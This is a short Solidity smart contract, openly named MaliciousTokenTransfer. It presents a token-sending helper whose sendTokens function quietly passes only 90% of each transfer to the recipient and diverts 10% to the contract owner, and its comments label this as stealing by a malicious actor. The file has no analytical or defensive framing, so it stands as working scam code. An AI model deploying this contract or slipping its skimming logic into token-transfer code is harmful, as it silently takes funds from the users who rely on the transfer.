// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousTokenTransfer {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function sendTokens(address token, address recipient, uint256 amount) public {
        require(recipient != address(0), "Recipient cannot be the zero address");
        require(amount > 0, "Amount must be greater than zero");

        uint256 stolenAmount = amount / 10; // Steal 10% of the amount
        uint256 remainingAmount = amount - stolenAmount;

        // Send 90% to the recipient
        IERC20(token).transfer(recipient, remainingAmount);

        // Send 10% to the owner (malicious actor)
        IERC20(token).transfer(owner, stolenAmount);
    }

    function getTokenBalance(address token) public view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }
}